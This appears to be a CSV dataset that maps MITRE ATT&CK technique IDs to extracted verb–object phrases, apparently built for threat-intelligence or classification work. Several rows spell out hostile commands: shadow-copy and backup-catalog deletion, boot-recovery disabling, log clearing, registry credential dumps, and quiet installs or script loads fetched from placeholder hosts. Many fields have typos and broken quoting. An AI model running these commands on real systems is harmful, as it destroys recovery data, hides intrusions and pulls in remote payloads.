id,what,where
t1490,use,set {{default}} bootstatuspolicy ignoreallfailures & bcdedit
t1490,use,"""wbadmin.exe delete catalog  quiet"""
t1493,intercept,data between process
t1494,alter,application binary
t1495,overwrite,non volatile
t1496,use,recource hijecking
t1497,check/search,"memory/ process/ file system/the registry/drive size/user activity/browser history/cache/bookmark/number of files in the home directories/speed of mouse click/ frequency of mouse click/fan/temperature/cpu check/security monitoring tool/sysinternals/wireshark/""hklm\software\oracle\virtualbox guest additions""/
t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\runonce
t1045,use,mpress
t1146,use,export histfilesize=0
t1085,use,document.write
t1201,use,chage  l
t1157,use,same name in higher up search path
t1087,acquire information,dscacheutil  q group
t1094,use,custom command and control protocol
t1081,use,group policy preference
t1110,use,pass the hash technique
t1195,,w
t1095,use,user datagram protocol
t1079,use,protocol encryption scheme
t1483,incorporate,seed value
t1199,use,valid account
t1060,create,nt\currentversion\winlogon\shellhkey_current_user\software\microsoft\windows\currentversion\policies\explorer\run
t1091,modify,media
t1042,use,hkey_classes_root[handler]
t1087,use,get msolrolemember powershell cmdlet
t1143,use,scripting language
t1069,use,dscl .  list /groups
t1087,use,passwd"""""""
t1497,enumerate,"""vmware""""/
t1054,use,powershell
t1050,use,utility
t1014,incercept,operating system api call
t1168,modify,crontab file
t1490,use,""vssadmin.exe delete shadows"""
t1497,check/search,"""vmware""""/
t1004,modify,winlogon registry key
t1497,check/search,service/nstalled program/manufacturer field/product field/vme specific hardware instruction/vme specific processor instruction
t1095,use,transport layer protocol
t1114,access,email forwarding rule
t1198,modify,hklm\software[\wow6432node]microsoft\cryptography\oid\encodingtype 0\cryptsipdllgetsigneddatamsg{{sip_guid}} to the dll providing sip?s cryptsipdllgetsigneddatamsg function
t1001,use,non standard data encoding system
t1048,use,internet web service
t1150,modify,~/library/preferences
t1144,load app,external hard drive
t1196,double click,double click the file
t1493,intercept,data over connection
t1021,use,ssh
t1135,use,df  ah
t1047,use,remote procedure call service
t1022,use,aes
t1166,use,chmod via bitmasking
t1183,register,malicious debugger
t1110,use,management service
t1106,use,createprocess   api
t1171,respond,nbt ns
t1064,interact,operating system at api label
t1064,,veil
t1048,use,h
t1160,disguise,system/library/launchdaemons
t1500,use,mingw
t1032,employ,rc6
t1220,use,msxsl.exe/wmi/windows management instrumentation
t1497,use,service/nstalled program/manufacturer field/product field/vme specific hardware instruction/vme specific processor instruction
t1083,use,dir/tree
t1052,use,usb drive
t1055,use,mem
t1069,use,groups
t1096,use,ads
t1130,use,path
t1003,use,mimipenguin tool
t1088,use,eventvwr.exe
t1497,enumerate,service/nstalled program/manufacturer field/product field/vme specific hardware instruction/vme specific processor instruction
t1003,use,text string/regex pattern
t1192,accompany,link with social engineering text
t1130,use,system.keychain
t1061,use,remote interactive session technique
t1143,use,powershell
t1090,use,zxproxy
t1082,use,ver utility
t1055,write dll path,process
t1159,use,launchd/launchctl
t1070,use,wevtutil cl system
t1142,use,security command line utility
t1497,use,""wmi query $q = """"select * from win32_fan"""" get wmiobject  query $q""""/information learnt on automated discovery technique/security software discovery technique/windows management instrumentation technique/powershell technique/systeminfo technique/the query registry  technique/scripting technique/sleep/timer/loop/ win32 deviceiocontrol function/special i/o port to send commands and receive output"""
t1497,check/search,"""wmi query $q = ""select * from win32_fan"" get wmiobject  query $q""/information learnt on automated discovery technique/security software discovery technique/windows management instrumentation technique/powershell technique/systeminfo technique/the query registry  technique/scripting technique/sleep/timer/loop/ win32 deviceiocontrol function/special i/o port to send commands and receive output"
t1497,enumerate,"""wmi query $q = ""select * from win32_fan"" get wmiobject  query $q""/information learnt on automated discovery technique/security software discovery technique/windows management instrumentation technique/powershell technique/systeminfo technique/the query registry  technique/scripting technique/sleep/timer/loop/ win32 deviceiocontrol function/special i/o port to send commands and receive output"
t1497,use,"""vmware""""/
t1096,use,mft
t1032,employ,3des
t1483,generate,different domain
t1027,use,language specific semantic
t1218,,msiexec.exe /q /i http[:]//site[.]com/file.msi
t1116,create,certificate
t1060,create,hkey_local_machine\software\microsoft\windows
t1140,use,b command
t1021,use,valid account technique
t1092,use,replication through removable media technique
t1108,credentialed access,remote service
t1168,use,at program
t1173,use,dde command
t1132,use,mime
t1106,use,createprocesswithtokenw   api
t1003,use,""reg save hklm\system system"""""""
t1497,use,"memory/ process/ file system/the registry/drive size/user activity/browser history/cache/bookmark/number of files in the home directories/speed of mouse click/ frequency of mouse click/fan/temperature/cpu check/security monitoring tool/sysinternals/wireshark/""hklm\software\oracle\virtualbox guest additions""/
t1480,use,filename
t1048,use,ftp
t1060,use,masquerading
t1187,use,template injection
t1066,use,updated version
t1114,create,cache files/ .pst / .ost
t1110,use,brute force technique
t1137,,hkey_current_user\software\microsoft\office test\special\perf
t1143,abuse,powershell
t1018,use,c:\windows\system32\drivers\etc\hosts file
t1022,use,custom algorithm
t1196,use,spearphishing attachment
t1032,use,xor
t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\explorer\shell folders
t1137,crafted,html page
t1071,use,http
t1106,use,createprocessinternalw   api
t1107,use,windows sysinternals sdelete
t1189,use,iframes
t1116,forge,certificate
t1036,move executable,trusted location
t1055,create,suspended process
t1032,use,plink utility
t1022,use,utility
t1134,dulicate,existing token
t1180,modify,hkcu\control panel\desktop\screensaveactive
t1021,use,remote service
t1069,use,net group /domain
t1114,create,webmail application/outlook web access
t1143,use,jscript
t1014,hook,operating system api call
t1090,use,zxportmsp
t1051,use,network file share
t1480,use,system time
t1032,use,tls
t1076,use,credential access technique
t1124,use,net
t1087,use,azure cli
t1085,use,getobject """"script:https[:]//www[.]example[.]com/malicious.sct"""" """""""
t1497,enumerate,"memory/ process/ file system/the registry/drive size/user activity/browser history/cache/bookmark/number of files in the home directories/speed of mouse click/ frequency of mouse click/fan/temperature/cpu check/security monitoring tool/sysinternals/wireshark/""hklm\software\oracle\virtualbox guest additions""/
t1092,use,removable media
t1032,employ,openssl
t1105,use,command and control channel
t1124,use,tz'
t1118,use,trusted windows utility
t1071,use,standardized application layer protocol
t1194,leverage,social media services
t1087,acquire information,net group
t1022,use,
t1034,create program,improperly specified program
t1149,modify,lc_unixthread
t1205,send,series of packet
t1043,use,udp:22  ssh
t1032,use,3des
t1499,use,tls protocol
t1043,use,tcp:80  http
t1196,use,command line
t1192,use,browser exploit
t1485,use,rm
t1096,use,master file table
t1130,use,library
t1499,use,service exhaustion flood
t1090,use,port redirection
t1020,use,exfiltration over command and control channel technique
t1486,withhold,decryption key
t1002,use,algorithm
t1074,use,data encrypted technique
t1117,pass,uniform resource locator
t1087,use,id"""""""
t1498,use,direct network flood
t1498,use,icmp
t1498,use,reflection amplification
t1498,use,ntp
t1498,use,botnet
t1498,use,dns
t1498,use,memcache protocol
t1498,use,udp
t1499,use,syn flood
t1499,use,"""ssl"
t1499,exploit,vulnerability
t1499,use,os exhaustion flood
t1499,use,application exhaustion flood
t1499,use,botnet
t1499,use,ack flood
t1499,use,system exploitation
t1499,use,application exploitation
t1499,use,simple http flood
t1499,use,ssl renegotiation attack
t1500,use,spearphishing attachment technique
t1500,use,csc.exe
t1500,use,gcc
t1501,,create
t1501,,modify
